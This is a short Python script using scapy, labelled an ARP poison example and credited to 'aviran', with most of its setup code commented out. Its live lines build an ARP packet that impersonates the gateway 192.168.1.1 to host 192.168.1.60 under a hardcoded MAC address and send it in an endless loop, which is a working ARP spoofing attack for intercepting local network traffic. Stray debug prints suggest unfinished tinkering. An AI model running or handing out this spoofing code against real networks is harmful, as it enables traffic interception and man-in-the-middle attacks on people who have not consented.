#!/usr/bin/python
print(5)
# Python arp poison example script
# Written by aviran
# visit for more details aviran.org

from scapy.all import *
# import sys
#print (sys.argv)
# sys.displayhook(1)
# def get_mac_address():
#     my_macs = [get_if_hwaddr(i) for i in get_if_list()]
#     for mac in my_macs:
#         if(mac != "00:00:00:00:00:00"):
#             return mac

# Timeout=2

# if len(sys.argv) != 3:
#     print ("Usage: arp_poison.py HOST_TO_ATTACK HOST_TO_IMPERSONATE")
#     sys.exit(1)

# a = 192.168.1.60
# b = 192.168.1.1

# my_mac = get_mac_address()
# my_mac = sys.argv[1]
my_mac = "18:4F:32:17:38:ED"
# if not my_mac:
#     print ("Cant get local mac address, quitting")
#     
#     sys.exit(1)
# print(my_mac)
packet = Ether()/ARP(op="who-has",hwsrc=my_mac, psrc="192.168.1.1" , pdst="192.168.1.60")
print("pac")
sendp(packet, loop=1, inter=0.2)
print("ok")